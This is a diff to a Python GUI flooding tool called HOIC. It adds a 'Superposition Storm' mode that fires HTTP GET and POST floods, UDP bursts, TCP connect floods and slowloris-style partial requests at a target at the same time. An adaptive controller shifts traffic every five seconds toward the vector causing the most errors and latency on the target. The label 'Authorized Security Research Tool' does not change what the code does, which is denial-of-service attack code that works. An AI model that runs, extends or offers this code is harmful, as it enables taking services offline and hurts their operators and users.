@@ -90,7 +90,16 @@ ATTACK_MODES = [
     "Slowloris (HTTP)",
     "Mixed (HTTP + UDP)",
     "Adaptive Saturation Seeker",
+    "Superposition Storm",
 ]
+
+SUPERPOSITION_VECTORS = (
+    "http_get",
+    "http_post",
+    "udp_burst",
+    "tcp_connect",
+    "slowloris_micro",
+)
 
 HTTP_MESSAGE_MODES = {
     "HTTP Flood",
@@ -98,12 +107,14 @@ HTTP_MESSAGE_MODES = {
     "Slowloris (HTTP)",
     "Mixed (HTTP + UDP)",
     "Adaptive Saturation Seeker",
+    "Superposition Storm",
 }
 
 PAYLOAD_MESSAGE_MODES = {
     "UDP Flood",
     "TCP Flood",
     "Mixed (HTTP + UDP)",
+    "Superposition Storm",
 }
 
 MESSAGE_SUPPORTED_MODES = HTTP_MESSAGE_MODES | PAYLOAD_MESSAGE_MODES
@@ -272,6 +283,106 @@ def active_resonance_workers(base_workers: int, elapsed: float, period: float = 
     return max(1, int(base_workers * factor))
 
 
+def compute_vector_pain_score(sent: int, errors: int, avg_latency_ms: float) -> float:
+    """Higher pain = vector is stressing the target more (errors + latency)."""
+    error_rate = compute_error_rate(sent, errors)
+    latency_factor = min(avg_latency_ms / 2000.0, 2.0)
+    return error_rate * 3.0 + latency_factor + errors * 0.01
+
+
+def adapt_vector_weights(
+    current_weights: Dict[str, float],
+    pain_scores: Dict[str, float],
+    temperature: float = 2.0,
+) -> Dict[str, float]:
+    """Shift probability mass toward vectors inflicting the most pain."""
+    vectors = list(pain_scores.keys())
+    if not vectors:
+        return current_weights
+    max_pain = max(pain_scores.values())
+    exp_scores = {
+        v: math.exp((pain_scores[v] - max_pain) / max(temperature, 0.1)) for v in vectors
+    }
+    total = sum(exp_scores.values()) or 1.0
+    target = {v: exp_scores[v] / total for v in vectors}
+    blend = 0.7
+    blended = {
+        v: blend * target[v] + (1.0 - blend) * current_weights.get(v, 1.0 / len(vectors))
+        for v in vectors
+    }
+    norm = sum(blended.values()) or 1.0
+    return {v: blended[v] / norm for v in vectors}
+
+
+def select_vector_by_weight(weights: Dict[str, float]) -> str:
+    r = random.random()
+    cumulative = 0.0
+    for vector, weight in sorted(weights.items()):
+        cumulative += weight
+        if r <= cumulative:
+            return vector
+    return list(weights.keys())[-1]
+
+
+def format_vector_weights(weights: Dict[str, float]) -> str:
+    return " | ".join(f"{k}:{weights[k]:.0%}" for k in sorted(weights))
+
+
+class SuperpositionController:
+    """Tracks per-vector pain and adaptively shifts attack superposition."""
+
+    def __init__(self, vectors: tuple = SUPERPOSITION_VECTORS):
+        self.vectors = vectors
+        self._lock = threading.Lock()
+        self.weights = {v: 1.0 / len(vectors) for v in vectors}
+        self._stats: Dict[str, Dict[str, float]] = {
+            v: {"sent": 0, "errors": 0, "latency_sum": 0.0, "samples": 0} for v in vectors
+        }
+        self.dominant_vector: Optional[str] = None
+        self.pain_scores: Dict[str, float] = {v: 0.0 for v in vectors}
+
+    def get_weights(self) -> Dict[str, float]:
+        with self._lock:
+            return dict(self.weights)
+
+    def record(self, vector: str, sent: int = 0, errors: int = 0, latency_ms: float = 0.0):
+        with self._lock:
+            bucket = self._stats[vector]
+            bucket["sent"] += sent
+            bucket["errors"] += errors
+            if latency_ms > 0:
+                bucket["latency_sum"] += latency_ms
+                bucket["samples"] += 1
+
+    def adapt(self) -> tuple:
+        with self._lock:
+            pain = {}
+            for vector in self.vectors:
+                bucket = self._stats[vector]
+                avg_lat = (
+                    bucket["latency_sum"] / bucket["samples"] if bucket["samples"] else 0.0
+                )
+                pain[vector] = compute_vector_pain_score(
+                    int(bucket["sent"]), int(bucket["errors"]), avg_lat
+                )
+                bucket["sent"] = 0
+                bucket["errors"] = 0
+                bucket["latency_sum"] = 0.0
+                bucket["samples"] = 0
+            self.pain_scores = pain
+            self.weights = adapt_vector_weights(self.weights, pain)
+            self.dominant_vector = max(pain, key=pain.get) if pain else self.vectors[0]
+            return self.dominant_vector, dict(self.weights), dict(pain)
+
+    def snapshot(self) -> Dict[str, Any]:
+        with self._lock:
+            return {
+                "dominant_vector": self.dominant_vector,
+                "vector_weights": dict(self.weights),
+                "vector_pain": dict(self.pain_scores),
+            }
+
+
 # ============================================================
 # STATS & CONTROLLER
 # ============================================================
@@ -288,6 +399,8 @@ class Stats:
         self.latencies_ms: deque = deque(maxlen=self.max_latency_samples)
         self.saturation_point: Optional[int] = None
         self.probe_history: List[Dict[str, Any]] = []
+        self.dominant_vector: Optional[str] = None
+        self.vector_weights: Dict[str, float] = {}
         self._lock = threading.Lock()
 
     def start(self):
@@ -298,6 +411,8 @@ class Stats:
             self.latencies_ms.clear()
             self.saturation_point = None
             self.probe_history = []
+            self.dominant_vector = None
+            self.vector_weights = {}
 
     def record_sent(self, count: int = 1):
         with self._lock:
@@ -326,6 +441,15 @@ class Stats:
         with self._lock:
             self.saturation_point = workers
 
+    def set_superposition_state(
+        self,
+        dominant_vector: Optional[str],
+        vector_weights: Dict[str, float],
+    ):
+        with self._lock:
+            self.dominant_vector = dominant_vector
+            self.vector_weights = dict(vector_weights)
+
     def get_percentiles(self) -> Dict[str, float]:
         with self._lock:
             samples = list(self.latencies_ms)
@@ -342,6 +466,8 @@ class Stats:
             samples = list(self.latencies_ms)
             saturation = self.saturation_point
             probes = list(self.probe_history)
+            dominant = self.dominant_vector
+            weights = dict(self.vector_weights)
         percentiles = {
             "p50": compute_percentile(samples, 50),
             "p95": compute_percentile(samples, 95),
@@ -355,6 +481,8 @@ class Stats:
             "latency": percentiles,
             "saturation_point": saturation,
             "probe_history": probes,
+            "dominant_vector": dominant,
+            "vector_weights": weights,
         }
 
 
@@ -415,6 +543,8 @@ class AttackController:
             self._start_mixed(cfg)
         elif cfg.mode == "Adaptive Saturation Seeker":
             self._start_saturation_seeker(cfg)
+        elif cfg.mode == "Superposition Storm":
+            self._start_superposition_storm(cfg)
         else:
             self.log_msg(f"Unknown mode {cfg.mode}", "ERROR")
             self.stop()
@@ -882,6 +1012,151 @@ class AttackController:
 
         self._launch_workers(udp_w, max(15, cfg.workers // 4), "MIX-UDP")
 
+    # ---------------- Superposition Storm ----------------
+    def _start_superposition_storm(self, cfg: AttackConfig):
+        def runner():
+            try:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                loop.run_until_complete(self._superposition_main(cfg))
+            except Exception as e:
+                self.log_msg(f"Superposition Storm error: {e}", "ERROR")
+            finally:
+                if self.running:
+                    self.stop()
+
+        t = threading.Thread(target=runner, daemon=True, name="HOIC-Superposition")
+        t.start()
+        self.workers.append(t)
+        self._asyncio_thread = t
+
+    def _superposition_udp_burst(self, ip: str, cfg: AttackConfig):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            payload = embed_message_in_payload(cfg.packet_size, cfg.attack_message)
+            sock.sendto(payload, (ip, cfg.target_port))
+        finally:
+            sock.close()
+
+    def _superposition_tcp_connect(self, ip: str, cfg: AttackConfig):
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((ip, cfg.target_port))
+            payload = embed_message_in_payload(min(cfg.packet_size, 2048), cfg.attack_message)
+            s.send(payload)
+        finally:
+            if s is not None:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+
+    def _superposition_slowloris_micro(self, ip: str, cfg: AttackConfig):
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4)
+            s.connect((ip, cfg.target_port))
+            s.send(f"GET {cfg.path} HTTP/1.1\r\n".encode())
+            s.send(f"Host: {cfg.target_host}\r\n".encode())
+            s.send(("User-Agent: " + random.choice(USER_AGENTS) + "\r\n").encode())
+            s.send(b"Connection: Keep-Alive\r\n")
+            msg = sanitize_http_header_value(cfg.attack_message)
+            if msg:
+                s.send(f"X-HOIC-Message: {msg}\r\n".encode())
+            s.send(f"X-HOIC-Superposition: {random.randint(1, 99999)}\r\n".encode())
+            time.sleep(0.15)
+        finally:
+            if s is not None:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+
+    async def _superposition_main(self, cfg: AttackConfig):
+        try:
+            ip = socket.gethostbyname(cfg.target_host)
+        except Exception as e:
+            self.log_msg(f"DNS resolve failed: {e}", "ERROR")
+            self.stop()
+            return
+
+        controller = SuperpositionController()
+        use_ssl = cfg.use_https or cfg.target_port == 443
+        scheme = "https" if use_ssl else "http"
+        url = f"{scheme}://{cfg.target_host}:{cfg.target_port}{cfg.path}"
+        connector = aiohttp.TCPConnector(limit=0, ssl=False)
+        timeout = aiohttp.ClientTimeout(total=cfg.timeout)
+
+        self.log_msg(
+            "Superposition Storm: 5 vectors in quantum superposition — "
+            "auto-adapts toward target's weakest layer every 5s"
+        )
+        self.log_msg(f"Vectors: {', '.join(SUPERPOSITION_VECTORS)}")
+
+        async def superposition_worker(wid: int):
+            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+                while not self.stop_event.is_set():
+                    vector = select_vector_by_weight(controller.get_weights())
+                    t0 = time.perf_counter()
+                    try:
+                        if vector == "http_get":
+                            h = headers_base.copy()
+                            h["X-HOIC-Superposition"] = f"get-{wid}"
+                            await self._send_http_request(session, url, cfg, h)
+                        elif vector == "http_post":
+                            h = headers_base.copy()
+                            h["X-HOIC-Superposition"] = f"post-{wid}"
+                            h["Content-Type"] = "application/octet-stream"
+                            data = embed_message_in_payload(
+                                random.randint(256, cfg.packet_size), cfg.attack_message
+                            )
+                            async with session.post(url, headers=h, data=data) as resp:
+                                await resp.read()
+                        elif vector == "udp_burst":
+                            await asyncio.to_thread(self._superposition_udp_burst, ip, cfg)
+                        elif vector == "tcp_connect":
+                            await asyncio.to_thread(self._superposition_tcp_connect, ip, cfg)
+                        elif vector == "slowloris_micro":
+                            await asyncio.to_thread(self._superposition_slowloris_micro, ip, cfg)
+
+                        latency = (time.perf_counter() - t0) * 1000
+                        controller.record(vector, sent=1, latency_ms=latency)
+                        self.stats.record_sent()
+                        self.stats.record_latency(latency)
+                    except asyncio.CancelledError:
+                        break
+                    except Exception:
+                        controller.record(vector, errors=1)
+                        self.stats.record_error()
+                        await asyncio.sleep(0.02)
+
+        async def adaptation_loop():
+            while not self.stop_event.is_set():
+                await asyncio.sleep(5)
+                if self.stop_event.is_set():
+                    break
+                dominant, weights, pain = controller.adapt()
+                self.stats.set_superposition_state(dominant, weights)
+                self.log_msg(
+                    f"Superposition collapse → dominant: {dominant} "
+                    f"(pain={pain.get(dominant, 0):.2f}) | {format_vector_weights(weights)}"
+                )
+
+        tasks = [asyncio.create_task(superposition_worker(i)) for i in range(cfg.workers)]
+        tasks.append(asyncio.create_task(adaptation_loop()))
+        try:
+            await asyncio.gather(*tasks)
+        except Exception as e:
+            self.log_msg(f"Superposition worker pool error: {e}", "ERROR")
+        finally:
+            snap = controller.snapshot()
+            self.stats.set_superposition_state(snap["dominant_vector"], snap["vector_weights"])
+            await connector.close()
+
     def _launch_workers(self, worker_func, count: int, prefix: str):
         for i in range(count):
             t = threading.Thread(target=worker_func, daemon=True, name=f"HOIC-{prefix}-{i}")
@@ -938,7 +1213,7 @@ class HOICApp:
         ).pack(side="left")
         ctk.CTkLabel(
             title_frame,
-            text="  v1.1  •  Authorized Security Research Tool",
+            text="  v1.2  •  Authorized Security Research Tool",
             font=ctk.CTkFont(size=12),
             text_color="#777777",
         ).pack(side="left", padx=12)
@@ -1112,10 +1387,10 @@ class HOICApp:
         self.stat_p95 = ctk.CTkLabel(stats_grid, text="p95: —", font=ctk.CTkFont(size=13))
         self.stat_p95.grid(row=1, column=1, padx=8, sticky="w")
 
-        self.stat_saturation = ctk.CTkLabel(
-            stats_grid, text="Breakpoint: —", font=ctk.CTkFont(size=13), text_color="#88ccff"
+        self.stat_superpower = ctk.CTkLabel(
+            stats_grid, text="Superpower: —", font=ctk.CTkFont(size=13), text_color="#88ccff"
         )
-        self.stat_saturation.grid(row=1, column=2, padx=8, sticky="w")
+        self.stat_superpower.grid(row=1, column=2, padx=8, sticky="w")
 
         ctk.CTkLabel(right, text="ACTIVITY LOG", font=ctk.CTkFont(size=14, weight="bold")).pack(
             anchor="w", padx=12, pady=(4, 2)
@@ -1161,6 +1436,8 @@ class HOICApp:
         elif http_mode:
             if mode == "HTTPS Flood":
                 hint = "Sent in TLS-encrypted HTTP — use HTTP Flood for cleartext capture"
+            elif mode == "Superposition Storm":
+                hint = "Embedded across all 5 superposition vectors (HTTP/UDP/TCP/slowloris)"
             else:
                 hint = "Cleartext: POST body hoic_message=, X-HOIC-Message header, User-Agent"
             label = "ATTACK MESSAGE (HTTP — visible in cleartext capture)"
@@ -1194,6 +1471,11 @@ class HOICApp:
             self.append_log(
                 "Saturation Seeker: workers slider sets max search bound; "
                 "duration should allow probe + resonance phases (60s+ recommended)"
+            )
+        elif choice == "Superposition Storm":
+            self.append_log(
+                "Superposition Storm: 5 attack vectors fire in parallel — "
+                "AI-style bandit adapts every 5s toward the vector hurting the target most"
             )
         self._update_message_field_state(choice)
 
@@ -1267,6 +1549,8 @@ class HOICApp:
                     "latency": stats.get("latency", {}),
                     "saturation_point": stats.get("saturation_point"),
                     "probe_history": stats.get("probe_history", []),
+                    "dominant_vector": stats.get("dominant_vector"),
+                    "vector_weights": stats.get("vector_weights", {}),
                 },
                 "log_excerpt": log_content.splitlines()[-50:],
             }
@@ -1323,10 +1607,16 @@ class HOICApp:
             p95 = lat.get("p95", 0)
             self.stat_p95.configure(text=f"p95: {p95:.0f}ms" if p95 else "p95: —")
 
+            dominant = stats.get("dominant_vector")
+            weights = stats.get("vector_weights", {})
             sat = stats.get("saturation_point")
-            self.stat_saturation.configure(
-                text=f"Breakpoint: {sat}" if sat is not None else "Breakpoint: —"
-            )
+            if dominant and weights:
+                pct = int(weights.get(dominant, 0) * 100)
+                self.stat_superpower.configure(text=f"Dominant: {dominant} ({pct}%)")
+            elif sat is not None:
+                self.stat_superpower.configure(text=f"Breakpoint: {sat}")
+            else:
+                self.stat_superpower.configure(text="Superpower: —")
 
             if self.controller.running:
                 self.status_label.configure(text="ATTACKING", text_color="#ff5555")
@@ -1363,7 +1653,7 @@ class HOICApp:
 
         mode = self.mode_var.get()
         use_https = "HTTPS" in mode or (
-            mode == "Adaptive Saturation Seeker" and port == 443
+            mode in ("Adaptive Saturation Seeker", "Superposition Storm") and port == 443
         )
         attack_message = self.message_var.get().strip()
 
